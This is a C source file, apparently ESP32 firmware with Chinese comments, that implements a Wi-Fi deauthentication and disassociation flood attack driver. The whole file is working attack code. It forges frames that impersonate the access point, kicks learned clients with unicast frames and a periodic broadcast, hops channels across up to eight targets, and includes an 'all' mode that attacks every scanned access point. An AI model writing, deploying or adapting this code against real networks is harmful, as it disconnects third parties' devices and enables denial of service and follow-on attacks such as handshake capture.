// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// Deauth / Disassoc 洪泛。单播踢客户端，广播当兜底，多 AP 时轮流跳信道。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "deauth"
#define MAX_TARGETS 8
// 多 AP 时每隔这么久换一个目标，太密了每跳一次都要重新收一遍空口
#define HOP_MS 300
// 每这么多次单播插一个广播 deauth：还没学到客户端时靠它也能生效
#define BROADCAST_EVERY 8

typedef struct {
    uint8_t bssid[6];
    uint8_t channel;
} target_t;

static bool s_active;
static target_t s_targets[MAX_TARGETS];
static size_t s_target_count;
static size_t s_target_cursor;
static uint32_t s_last_hop_ms;
static uint16_t s_reason = 1;
static uint32_t s_cursor;
static uint32_t s_frames;
static uint32_t s_unicast;
static uint32_t s_broadcast;
static uint32_t s_disassoc;

static void deauth_tick(uint32_t now_ms) {
    if (!s_active || s_target_count == 0) {
        return;
    }
    if (s_target_count > 1 && (s_last_hop_ms == 0 || now_ms - s_last_hop_ms >= HOP_MS)) {
        s_last_hop_ms = now_ms;
        s_target_cursor = (s_target_cursor + 1) % s_target_count;
        hal_wifi_channel_select(OWNER, s_targets[s_target_cursor].channel);
    }

    const target_t *t = &s_targets[s_target_cursor];
    static uint8_t stas[HAL_WIFI_STA_MAX][6];
    static uint8_t frame[64];
    const size_t n = attack_sta_on_channel(t->channel, stas, HAL_WIFI_STA_MAX);

    if (n == 0 || (s_cursor % BROADCAST_EVERY) == (BROADCAST_EVERY - 1)) {
        static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
        s_cursor++;
        const int len = wf_build_deauth(frame, sizeof(frame), kBcast, t->bssid, t->bssid, s_reason);
        if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            s_broadcast++;
        }
        return;
    }

    const uint8_t *sta = stas[s_cursor % n];
    const bool disassoc = (s_cursor % 3) == 2;
    s_cursor++;
    // 冒充 AP 发给客户端：sa 和 bssid 都得是 AP，否则很多网卡直接丢
    const int len = disassoc ? wf_build_disassoc(frame, sizeof(frame), sta, t->bssid, t->bssid,
                                                 s_reason)
                             : wf_build_deauth(frame, sizeof(frame), sta, t->bssid, t->bssid,
                                               s_reason);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        s_unicast++;
        if (disassoc) {
            s_disassoc++;
        }
    }
}

// 名单解析："1,3,5" 这种。越界或者不是数字就当没写。
static size_t parse_list(const char *text, uint32_t out[MAX_TARGETS]) {
    size_t count = 0;
    const char *p = text;
    while (p != NULL && *p != '\0' && count < MAX_TARGETS) {
        while (*p == ' ' || *p == ',') {
            p++;
        }
        if (*p == '\0') {
            break;
        }
        uint32_t value = 0;
        bool digits = false;
        while (*p >= '0' && *p <= '9') {
            value = value * 10 + (uint32_t)(*p - '0');
            p++;
            digits = true;
        }
        if (!digits) {
            break;
        }
        out[count++] = value;
        while (*p != '\0' && *p != ',') {
            p++;
        }
    }
    return count;
}

static esp_err_t begin(const uint32_t *indexes, size_t count, uint16_t reason, wb_reply_t *reply) {
    if (count == 0) {
        wb_reply_fail(reply, "没给目标，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    s_target_count = 0;
    for (size_t i = 0; i < count && s_target_count < MAX_TARGETS; i++) {
        wt_entry_t ap;
        if (!attack_target_ap(indexes[i], &ap)) {
            continue;
        }
        memcpy(s_targets[s_target_count].bssid, ap.bssid, 6);
        s_targets[s_target_count].channel = ap.channel ? ap.channel : 1;
        s_target_count++;
    }
    if (s_target_count == 0) {
        wb_reply_fail(reply, "这些索引里没有 AP");
        return ESP_ERR_INVALID_ARG;
    }
    s_reason = reason;
    s_target_cursor = 0;
    s_last_hop_ms = 0;
    s_cursor = 0;
    s_frames = 0;
    s_unicast = 0;
    s_broadcast = 0;
    s_disassoc = 0;

    hal_wifi_sniffer_enable(true);
    // 多 AP 要自己跳信道，所以租约用 roaming 模式；单 AP 也走同一条路，省一个分支
    const esp_err_t err =
        hal_wifi_channel_acquire(OWNER, HAL_CH_ROAMING, 0, 0);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "射频被占着（%s）", esp_err_to_name(err));
        return err;
    }
    hal_wifi_channel_select(OWNER, s_targets[0].channel);
    s_active = true;
    attack_emit("deauth", true, "aps=%u ch=%u", (unsigned)s_target_count,
                (unsigned)s_targets[0].channel);
    wb_reply_line(reply, "deauth 开跑 aps=%u ch=%u reason=%u", (unsigned)s_target_count,
                  (unsigned)s_targets[0].channel, (unsigned)s_reason);
    return ESP_OK;
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "reason", .type = WB_T_U32, .required = false, .min = 0, .max = 65535, .def = 1},
};

static const wb_policy_t kAllPolicy[] = {
    {.name = "reason", .type = WB_T_U32, .required = false, .min = 0, .max = 65535, .def = 1},
};

static const wb_policy_t kListPolicy[] = {
    {.name = "list", .type = WB_T_STR, .required = true, .def_str = ""},
    {.name = "reason", .type = WB_T_U32, .required = false, .min = 0, .max = 65535, .def = 1},
};

static esp_err_t deauth_start(wb_args_t *args, wb_reply_t *reply) {
    const uint32_t idx = wb_args_u32(args, "idx");
    return begin(&idx, 1, attack_reason(wb_args_u32(args, "reason")), reply);
}

static esp_err_t deauth_all(wb_args_t *args, wb_reply_t *reply) {
    uint32_t indexes[WT_MAX_ENTRIES];
    const uint32_t total = wt_count();
    size_t count = 0;
    for (uint32_t i = 0; i < total && count < MAX_TARGETS; i++) {
        const wt_entry_t *entry = wt_at(i);
        if (entry != NULL && entry->kind == WT_KIND_AP) {
            indexes[count++] = i;
        }
    }
    return begin(indexes, count, attack_reason(wb_args_u32(args, "reason")), reply);
}

static esp_err_t deauth_list(wb_args_t *args, wb_reply_t *reply) {
    uint32_t indexes[MAX_TARGETS];
    const size_t count = parse_list(wb_args_str(args, "list"), indexes);
    if (count == 0) {
        wb_reply_fail(reply, "list 里没有数字，格式像 list=1,3,5");
        return ESP_ERR_INVALID_ARG;
    }
    return begin(indexes, count, attack_reason(wb_args_u32(args, "reason")), reply);
}

static void deauth_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("deauth", false, NULL);
}

static esp_err_t deauth_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t unicast = s_unicast;
    const uint32_t broadcast = s_broadcast;
    const uint32_t disassoc = s_disassoc;
    deauth_stop();
    attack_report_rate(reply, "deauth", frames);
    wb_reply_line(reply, "unicast=%u bcast=%u disassoc=%u", (unsigned)unicast, (unsigned)broadcast, (unsigned)disassoc);
    return ESP_OK;
}

static esp_err_t deauth_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[64];

    const uint8_t *bssid = (s_target_count > 0) ? s_targets[0].bssid : kBcast;
    int len = wf_build_deauth(frame, sizeof(frame), kSta, bssid, bssid, s_reason);
    if (len <= 0) {
        wb_reply_fail(reply, "组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "deauth len=%d subtype=0x%02X reason=%u", len, frame[0] & 0xF0,
                  (unsigned)(frame[24] | (frame[25] << 8)));
    len = wf_build_disassoc(frame, sizeof(frame), kSta, bssid, bssid, s_reason);
    if (len <= 0) {
        wb_reply_fail(reply, "disassoc 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "disassoc len=%d subtype=0x%02X", len, frame[0] & 0xF0);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", deauth_start, "idx=1..64 [reason=0..65535]", kStartPolicy, 2},
    {"all", deauth_all, "[reason=0..65535]", kAllPolicy, 1},
    {"list", deauth_list, "list=\"1,3,5\" [reason=0..65535]", kListPolicy, 2},
    {"stop", deauth_stop_cmd, "", NULL, 0},
    {"test", deauth_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "deauth",
    .title = "Deauth flood",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t deauth_frames(void) {
    return s_frames;
}

static bool deauth_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "deauth",
    .object = &kObject,
    .stop = deauth_stop,
    .tick = deauth_tick,
    .frames = deauth_frames,
    .active = deauth_active,
};

const attack_driver_t *deauth_attack(void) {
    return &kDriver;
}
